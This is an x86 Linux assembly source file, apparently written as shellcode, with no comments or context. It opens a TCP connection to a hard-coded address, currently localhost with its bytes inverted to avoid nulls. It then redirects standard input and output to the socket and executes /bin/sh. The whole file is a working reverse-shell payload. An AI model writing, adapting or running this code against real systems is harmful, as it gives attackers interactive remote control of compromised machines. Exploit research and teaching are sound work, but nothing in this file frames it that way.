section .text
global _start

%define SOCKETCALL 	102
%define READ  		3
%define WRITE 		4
%define EXIT		1
%define EXECV		11
%define DUP2		63	
%define FORK		2
%define WAITPID		7
%define CLOSE		6
	
%define SYS_SOCKET 	1
%define SYS_CONNECT	3

%define AF_INET		2
%define SOCK_STREAM	1
%define IPPROTO_TCP	6

%define IP		0x0100007f
%define PORT		0x0010
	
_start:
.SOCKET:
	push IPPROTO_TCP
	push SOCK_STREAM
	push AF_INET

	xor ebx, ebx
	xor eax, eax
	mov ecx, esp
	mov bl, SYS_SOCKET
	mov al, SOCKETCALL
	int 0x80

	mov esi, eax
	
.CONNECT:
	mov eax, ~IP
	not eax
	push eax
	mov ax, ~PORT
	not ax
	push word ax
	push word AF_INET
	mov eax, esp

	push 16
	push eax
	push esi

	mov ecx, esp
	xor ebx, ebx
	mov bl, SYS_CONNECT
	xor eax, eax
	mov al, SOCKETCALL
	int 0x80
		
.DUP2:
	mov ebx, esi
	xor ecx, ecx
	xor eax, eax
	mov al, DUP2
	int 0x80

	mov ebx, esi
	xor ecx, ecx
	inc ecx
	xor eax, eax
	mov al, DUP2
	int 0x80

.EXECV:
	xor eax, eax
	push eax
	push '//sh'
	push '/bin'
	mov ebx, esp

	push eax
	push ebx

	xor edx, edx
	mov ecx, esp
	mov al, EXECV
	int 0x80
